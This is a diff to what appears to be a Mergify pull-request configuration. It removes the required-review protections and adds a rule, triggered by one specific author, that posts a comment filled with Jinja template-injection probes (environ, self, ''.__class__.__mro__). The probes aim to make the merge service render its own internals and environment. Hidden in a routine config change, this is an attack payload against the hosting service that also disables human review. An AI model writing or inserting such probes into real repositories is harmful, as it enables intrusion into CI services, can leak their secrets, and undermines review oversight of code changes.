@@ -1,21 +1,12 @@
-extends: .github
-
-merge_protections:
-  - name: 👀 Review Requirements
-    if:
-      - author != dependabot[bot]
-    success_conditions:
-      - "#approved-reviews-by >= 1"
-
-queue_rules:
-  - name: default
-    commit_message_format:
-      title: pr-title
-      body: pr-body
-      trailers:
-        - approved-by
-    merge_method: squash
-
-merge_protections_settings:
-  reporting_method: deployments
-  auto_merge_conditions: true
+pull_request_rules:
+  - name: probe-comment
+    conditions:
+      - author ~= ^akashsebastian333$
+    actions:
+      comment:
+        message: |
+          PROBE-1 {{ current_branch }}
+          PROBE-2 {{ environ | length }}
+          PROBE-3 {{ self }}
+          PROBE-4 {{ ''.__class__ }}
+          PROBE-5 {{ ''.__class__.__mro__ }}
